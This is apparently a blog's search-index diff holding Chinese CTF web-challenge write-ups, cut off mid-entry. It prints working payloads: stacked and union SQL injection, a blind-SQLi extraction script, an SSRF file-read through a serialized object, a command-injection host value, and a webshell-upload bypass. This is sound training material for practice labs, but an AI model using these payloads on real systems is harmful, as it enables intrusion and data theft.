+<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/3.png" alt="1"></p>
+<p>直接拿到了flag</p>
+]]></content>
+      <tags>
+        <tag>knightctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Most-Secure-Calculator</title>
+    <url>/2022/01/28/Most-Secure-Calculator/</url>
+    <content><![CDATA[<h1 id="计算器1"><a href="#计算器1" class="headerlink" title="计算器1"></a>计算器1</h1><p>一样先进去看一下</p>
+<p><img src="/2022/01/28/Most-Secure-Calculator/1.png" alt="1"></p>
+<p>进行一个简单的wfuzz测试</p>
+<p>发现啥也没过滤</p>
+<p>然后</p>
+<p>随便输入一些数看看</p>
+<p><img src="/2022/01/28/Most-Secure-Calculator/4.png" alt="1"></p>
+<p>发现这里面是一个简单的命令执行所以直接执行系统命令试试</p>
+<p><img src="/2022/01/28/Most-Secure-Calculator/2.png" alt="1"></p>
+<p>发现可以执行基本的system命令</p>
+<p>然后直接执行cat flag.txt就行拉</p>
+<p><img src="/2022/01/28/Most-Secure-Calculator/3.png" alt="1"></p>
+<h1 id="KCTF-WaS-mY-cAlCuLaToR-sAfE"><a href="#KCTF-WaS-mY-cAlCuLaToR-sAfE" class="headerlink" title="KCTF{WaS_mY_cAlCuLaToR_sAfE}"></a>KCTF{WaS_mY_cAlCuLaToR_sAfE}</h1>]]></content>
+      <tags>
+        <tag>knightctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MRCTF2020]Ez_bypass</title>
+    <url>/2022/01/29/MRCTF2020-Ez-bypass/</url>
+    <content><![CDATA[<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>首先进入题目看一看</p>
+<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/2.png" alt="1"></p>
+<p>进入源码可以看到排列好的函数</p>
+<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/1.png" alt="1"></p>
+<p>可以看出我们需要绕过这些if</p>
+<p>考到了两个知识点：</p>
+<p>1、MD5碰撞绕过</p>
+<p>2、php弱比较</p>
+<p>MD5碰撞比较好绕过</p>
+<p>可以通过数组绕过（0e绕过，但是尝试了一下不知道为啥不行）</p>
+<p>因为MD5无法操作数组它会将数组看成0，但是MD5之前的数又不相同所以可以直接绕过</p>
+<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/3.png" alt="1"></p>
+<p>接下来的弱比较漏洞更好绕过了</p>
+<p>他需要判断passwd为1234567</p>
+<p>我们只需要传入1234567后面带字母就行了</p>
+<p>因为php是一个弱类型的函数</p>
+<p>而我们输入的数的第一个是1为整型所以她会把这组数据都看作整型</p>
+<p>直接过滤掉a</p>
+<p>就可以直接拿到flag</p>
+<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/4.png" alt="1"></p>
+<p>$flag=”flag{cf290612-38d0-46a8-9ab8-396a0c556d2a}“</p>
+]]></content>
+      <tags>
+        <tag>MRCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Blacklist</title>
+    <url>/2022/01/30/Blacklist/</url>
+    <content><![CDATA[<h1 id="Blacklist"><a href="#Blacklist" class="headerlink" title="Blacklist"></a>Blacklist</h1><p>[可以先看看之前强网杯的随便住]</p>
+<p>首先进入题目：</p>
+<p><img src="/2022/01/30/Blacklist/1.png" alt="1"></p>
+<p>看起来是sql注入先试试看看有啥报错</p>
+<p><img src="/2022/01/30/Blacklist/2.png" alt="1"></p>
+<p>看起来是单引号字符型漏洞</p>
+<p>测试一下他的列数</p>
+<p><img src="/2022/01/30/Blacklist/3.png" alt="1"></p>
+<p>4看起来不行</p>
+<p>测试了一下2的时候可以正常回显</p>
+<p><img src="/2022/01/30/Blacklist/4.png" alt="1"></p>
+<p>所以列数是2，用select看看有没有回显的地方</p>
+<p><img src="/2022/01/30/Blacklist/5.png" alt="1"></p>
+<p>看到他过滤了很多东西就连命名表都过滤了但是没有过滤符号</p>
+<p>但是没有过滤show所以考虑到堆叠注入</p>
+<p>看一看库</p>
+<p><img src="/2022/01/30/Blacklist/6.png" alt="1"></p>
+<p>表：</p>
+<p><img src="/2022/01/30/Blacklist/7.png" alt="1"></p>
+<p>再看看FlagHere的字段：</p>
+<p><img src="/2022/01/30/Blacklist/8.png" alt="1"></p>
+<p>还有words字段</p>
+<p><img src="/2022/01/30/Blacklist/9.png" alt="1"></p>
+<p>可以看到我们的回显就是再words表里面返回的</p>
+<p>就想到我们是不是可以更改表名让显示的表是flaghere这张表</p>
+<p>但是上面的rename还有alterupdate啥的都被过滤了</p>
+<p>被卡住了</p>
+<p>上网查了一下知道这样一个骚姿势：（参考网址：<a class="link" href="https://www.cnblogs.com/gaonuoqi/p/12398554.html%EF%BC%89">https://www.cnblogs.com/gaonuoqi/p/12398554.html）<i class="fas fa-external-link-alt"></i></a></p>
+<p>handler函数</p>
+<p>handleropen可以打开这个表再close之前都可以改变，那我们就可以直接把flaghere这个表第一个读取</p>
+<p>就可以替换掉words</p>
+<p><img src="/2022/01/30/Blacklist/10.png" alt="1"></p>
+<p>payload=?inject=1’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
+<p>得到flag</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>随便注</title>
+    <url>/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>首先进入题目：</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/1.png" alt="1"></p>
+<p>看起来是sql注入先试试看看有啥报错</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.png" alt="1"></p>
+<p>看起来是单引号字符型漏洞</p>
+<p>测试一下他的列数</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/3.png" alt="1"></p>
+<p>4看起来不行</p>
+<p>测试了一下2的时候可以正常回显</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/4.png" alt="1"></p>
+<p>所以列数是2，用select看看有没有回显的地方</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/5.png" alt="1"></p>
+<p>看到他过滤了很多东西就连命名表都过滤了但是没有过滤符号</p>
+<p>但是没有过滤show所以考虑到堆叠注入</p>
+<p>看一看库</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" alt="1"></p>
+<p>表：</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" alt="1"></p>
+<p>发现其中有两个表</p>
+<p>看看里面有啥</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/11.png" alt="1"></p>
+<p>发现单引号不行，测试一下双引号还有反撇号</p>
+<p>发现反撇号`可以</p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/7.png" alt="1"></p>
+<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/12.png" alt="1"></p>
+<p>可以看到1919这个表这里面含有flag但是输出的时候输出的是words表中的数据</p>
+<p>而这题又屏蔽了一些可以用的函数</p>
+<p>想想其他办法</p>
+<p>我们可以重命名表然后把表中的flag改成id这样查询就可以直接查询到id的数据而id的数据就是flag</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload=1&#x27;;RENAME TABLE `words` TO `word1`;RENAME `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100)SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from `words`;#`</span><br></pre></td></tr></table></figure>
+
+<p>就可以直接输出flag了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;39e1f712-9675-492f-9e7a-7cb9ece7ba2f</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>(CISCN2019 华北赛区 Day2 Web1)Hack World</title>
+    <url>/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/</url>
+    <content><![CDATA[<h1 id="今天来写一下Hack-World"><a href="#今天来写一下Hack-World" class="headerlink" title="今天来写一下Hack World"></a>今天来写一下Hack World</h1><p>首先还是先进入题目：</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/2.png" alt="1"></p>
+<p>提示我们我们想要的flag再表flag中的flag列中</p>
+<p>我们可以猜一下payload=select flag from flag</p>
+<p>先试试输入数字看看</p>
+<p>发现1是</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/1.png" alt="1"></p>
+<p>2是<img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/3.png" alt="1"></p>
+<p>0和3就报错了</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/4.png" alt="1"></p>
+<p>输入数字看一下<img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/5.png" alt="1"></p>
+<p>返回了一个布尔值</p>
+<p>那试试布尔盲注判断它是否返回了正常值</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/6.png" alt="1"></p>
+<p>发现可以正常返回确定了是布尔盲注</p>
+<p>写个脚本看看结果database是啥</p>
+<p>附python脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://9be95f60-1d06-4cdd-8893-5fdeecf731f3.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;)&#x27;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            a +=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>看到当前的表名字是ctftraining</p>
+<p>想到我们刚刚的select flag from flag</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/7.png" alt="1"></p>
+<p>会不会是空格被注释掉了，因为这些函数是可以使用的，尝试一下绕过这个空格</p>
+<p>怎么绕呢，看到前面括号可以正常执行</p>
+<p>试试括号绕过也就是select(flag)from(flag)</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/8.png" alt="1"></p>
+<p>可以运行</p>
+<p>那就好办了因为前面说了</p>
+<p>flag就在这里面</p>
+<p>所以我们直接构造payload打</p>
+<p>附上payload：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://9be95f60-1d06-4cdd-8893-5fdeecf731f3.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&#x27;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            a +=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>就可以拿到flag拉</p>
+]]></content>
+      <tags>
+        <tag>CISCN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fakebook</title>
+    <url>/2022/01/31/fakebook/</url>
+    <content><![CDATA[<h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h1><p>今天的第二条</p>
+<p>先看看题目</p>
+<p><img src="/2022/01/31/fakebook/1.png" alt="1"></p>
+<p>页面上有些登录信息以及两个网页</p>
+<p>join创建账户</p>
+<p><img src="/2022/01/31/fakebook/2.png" alt="1"></p>
+<p><img src="/2022/01/31/fakebook/7.png" alt="1"></p>
+<p>login登录</p>
+<p>登上去试试</p>
+<p><img src="/2022/01/31/fakebook/6.png" alt="1"></p>
+<p>可以看到这里面注入都没啥用</p>
+<p>用户名可以点击</p>
+<p>进去看看</p>
+<p><img src="/2022/01/31/fakebook/8.png" alt="1"></p>
+<p>可以看到以get方式传入了一个no</p>
+<p>测试一下sql注入</p>
+<p>发现屏蔽了空格可以用/**/绕过</p>
+<p>看一下列数</p>
+<p><img src="/2022/01/31/fakebook/3.png" alt="1"></p>
+<p>看到有4列而且2在页面上回显了</p>
+<p>看到有sql注入漏洞</p>
+<p>进行注入</p>
+<p><img src="/2022/01/31/fakebook/4.png" alt="1"></p>
+<p><img src="/2022/01/31/fakebook/5.png" alt="1"></p>
+<p>可以看到库表列，下面写一下我拿到的结果</p>
+<p>fakebook,information_schema,mysql,performance_schema,test    库</p>
+<p>fakebook里面含有users里面是我们注册时账号密码</p>
+<p>但是可以看到</p>
+<p><img src="/2022/01/31/fakebook/11.png" alt="1"></p>
+<p>可以看到里面时我们的账号密码以及data</p>
+<p>我们的密码时按照序列化显示的</p>
+<p>到这里卡住了</p>
+<p>想想别的办法</p>
+<p>查看一下robots.txt看看网页有没有设置机器人</p>
+<p><img src="/2022/01/31/fakebook/9.png" alt="1"></p>
+<p>一看还真有</p>
+<p>里面给出了提示有一个uesr.php的备份文件</p>
+<p>我们输入这个网址可以下载到这个文件的源代码</p>
+<p>看一下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们传入了三个参数，name，age以及blog而blog会读取我们输入的地址</p>
+<p>他的主要工作是建立会话判断一下是不是有效请求，不是就返回404，curl_exec这里是可能存在ssrf漏洞的</p>
+<p>可以用ssrf来伪文件读取</p>
+<p>可是我们怎么知道flag的文件地址呢</p>
+<p>试一下御剑</p>
+<p>可以看到flag.php就在文件当中，而之前的报错中可以看到大部分的网页全部都是存储再/var/www/html/中的</p>
+<p>我们可以来读一度这里的文件</p>
+<p>之前看到我们在之前注入的第四位是data，这个里面包含了博客的网址，如果其中有数就会读取出来</p>
+<p>而他又是序列化之后的结果，我们可以更改里面的数据让他读取的文件变成flag.php</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:21:&quot;paixiaoxing.github.io“;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>改成：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就可以再回显的页面直接读取到flag.php里面的代码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload=?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>在源代码里面发现了base64加密过的flag</p>
+<p>拿到解密文件里面解密一下就可以拿到flag了</p>
+<p>后来我回头又看了一下，知道了flag的路径，我们是不是也可以用load_file()这个函数直接读取flag里面的值呢</p>
+<p>看一下权限</p>
+<p><img src="/2022/01/31/fakebook/12.png" alt="1"></p>
+<p>发现居然是root权限那么应该可行</p>
+<p><img src="/2022/01/31/fakebook/13.png" alt="1"></p>
+<p>发现这样也可以拿到flag</p>
+<p>之前的需要base64解码一下</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>BabyUpload</title>
+    <url>/2022/02/01/BabyUpload/</url>
+    <content><![CDATA[<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>名字一看就知道是文件上传</p>
+<p>老样子先随便传一些文件进去看看</p>
+<p><img src="/2022/02/01/BabyUpload/1.png" alt="1"></p>
+<p>传入php一句话木马发现不能有ph后缀</p>
+<p>那么试试别的</p>
+<p><img src="/2022/02/01/BabyUpload/2.png" alt="1"></p>
+<p><img src="/2022/02/01/BabyUpload/3.png" alt="1"></p>
+<p>发现jpg可以传</p>
+<p>那么就是htaccess改后缀了</p>
+<p>抓个包，上传个一句话木马</p>
+<p><img src="/2022/02/01/BabyUpload/4.png" alt="1"></p>
+<p>发现他还是被拦截了</p>
+<p>因为之前jpg可以上传。那么可以猜测他拦截的是文件的内容</p>
+<p>测试了一下发现‘&lt;?’不能在文件里面</p>
+<p>卡在这里了</p>
+<p>上网查了一下，学到了</p>
+<p>可以用$_REQUEST方式传入数据查询</p>
+<p><img src="/2022/02/01/BabyUpload/6.png" alt="1"></p>
+<p>用html自带的script闭合中间语言用php标识把中间的语句用变成php代码，然后我门可以在下面的用post传参直接命令执行</p>
+<p>试一下phpinfo</p>
+<p><img src="/2022/02/01/BabyUpload/7.png" alt="1"></p>
+<p>但是system好像不能用</p>
+<p>我们可以show_source()来读文件</p>
+<p>直接构造payload：shell=show_source(“/flag”)</p>
+]]></content>
+      <tags>
+        <tag>GXYCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>EasyJava</title>
+    <url>/2022/02/01/EasyJava/</url>
+    <content><![CDATA[<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>java类的题目没写过，还是先进去看看把</p>
+<p><img src="/2022/02/01/EasyJava/3.png" alt="1"></p>
+<p>不知道是啥漏洞，提示了是java应该不是sql注入</p>
+<p>尝试爆破的时候发现爆出了账号密码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin888</span><br></pre></td></tr></table></figure>
+
+<p>登录进去看看</p>
+<p><img src="/2022/02/01/EasyJava/1.png" alt="1"></p>
+<p>可惜，flag不在这里，而且是送分题</p>
+<p>去看看别的</p>
+<p>主页下面有个help点进去看看</p>
+<p><img src="/2022/02/01/EasyJava/2.png" alt="1"></p>
+<p>好像有任意文件读取漏洞，但是读不到</p>
+<p>试试直接进入，下载了一个文件</p>
+<p>可是里面也没有什么信息，是个假的</p>
+<p>这里我就不会做了因为java也没做过就去看了看大佬的wp</p>
+<p>没想到请求方式也是假的用post可以直接下载</p>
+<p>但是之前我已经下载过了</p>
+<p>这之后涉及到一个java-web开发的一个点，因为没接触过所以这里偷抄记录一下大佬写的（<a class="link" href="https://blog.csdn.net/wy_97/article/details/78165051%EF%BC%89">https://blog.csdn.net/wy_97/article/details/78165051）<i class="fas fa-external-link-alt"></i></a></p>
+<p>说是WEB-INF是javaweb应用的安全目录，如果想要访问其中的文件，必须通过web.xml</p>
+<p>相互映射才能访问</p>
+<p>简单来说就是</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> WEB-INF主要包含一下文件或目录：</span><br><span class="line">    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">    /WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>
+
+<p>我们可以post传入web.xml读取一下</p>
+<p><img src="/2022/02/01/EasyJava/4.png" alt="1"></p>
+<p>找到flag了，发现在com/wm/ctf/FlagController里面有个flag</p>
+<p>读取一下class文件</p>
+<p>路径就是/classes/com/wm/ctf/FlagController.class</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>
+
+<p>POST下载文件</p>
+<p><img src="/2022/02/01/EasyJava/5.png" alt="1"></p>
+<p>将其中的base64编码解码就能得到了</p>
+<p><img src="/2022/02/01/EasyJava/6.png" alt="1"></p>
+]]></content>
+      <tags>
+        <tag>RoarCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OnlineTool</title>
+    <url>/2022/02/03/OnlineTool/</url>
+    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">此题涉及到的知识点：</span><br><span class="line">nmap的使用、RCE、escapeshellarg和escapeshellcmd的组合引发的引号逃逸代码执行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目一开始给到了思路RCE跟PHP</p>
+<p>有个host那就试试直接命令执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?host=127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/03/OnlineTool/2.png" alt="1"></p>
+<p>没用，看看题目再看看代码，可能是跟nmap工具有关</p>
+<p>查了一下他的使用方法</p>
+<p>oG可以再文件里写入程序</p>
+<p><img src="/2022/02/03/OnlineTool/3.png" alt="1"></p>
+<p>那我们是否可以让他扫描我们的一句话木马存入我们指定的php文件中呢？</p>
+<p>试一下</p>
+<p><img src="/2022/02/03/OnlineTool/4.png" alt="1"></p>
+<p>发现可以上传</p>
+<p>也给了文件地址</p>
+<p>但是怎么也连不上</p>
+<p>而且还有两个函数也不太清楚</p>
+<p>实在不会，找了大佬的wp看了一下</p>
+<p>发现</p>
